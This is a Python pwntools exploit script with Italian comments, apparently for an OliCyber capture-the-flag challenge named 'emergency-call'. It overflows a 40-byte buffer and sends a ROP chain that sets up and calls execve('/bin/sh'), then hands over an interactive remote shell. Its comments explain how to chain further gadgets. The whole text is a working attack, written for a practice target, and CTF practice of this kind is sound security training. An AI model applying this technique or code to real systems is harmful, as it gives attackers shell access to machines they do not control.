from pwn import *

# Cambia questa flag per passare da locale a remoto
LOCAL = False

elf = ELF('./emergency-call')  # il binario scaricato dalla challenge
context.binary = elf

if LOCAL:
    # Breakpoint sui gadget che vuoi ispezionare
    gdbscript = '''
    break *0x4010db
    continue
    '''
    p = gdb.debug('./emergency-call', gdbscript=gdbscript)
else:
    context.log_level = 'debug'
    p = remote('emergency.challs.olicyber.it', 10306)

p.sendafter(b'call?', b'/bin/sh\x00')

offset = 40
pop_rdi = 0x401032
pop_rsi = 0x401034
pop_rdx = 0x401036
xor_rax_rdi = 0x401038
syscall_gadget = 0x40101a
binsh_addr = 0x404000

payload  = b"A" * offset
payload += p64(pop_rdi) + p64(59)          # RDI = 59
payload += p64(xor_rax_rdi)                 # RAX = 59
payload += p64(pop_rdi) + p64(binsh_addr)  # RDI = 0x404000 ("/bin/sh")
payload += p64(pop_rsi) + p64(0)            # RSI = 0
payload += p64(pop_rdx) + p64(0)            # RDX = 0
payload += p64(syscall_gadget)              # execve("/bin/sh", NULL, NULL)

# Se hai altri gadget nella tua ROP chain, li concateni semplicemente con un +. Esempio:
# payload = b"A" * offset + p64(gadget_1) + p64(argomento) + p64(gadget_2)

# 4. Invia il payload
p.sendafter(b'emergency?',payload)

# 5. Passa al controllo interattivo (fondamentale se l'exploit apre una shell)
p.interactive()
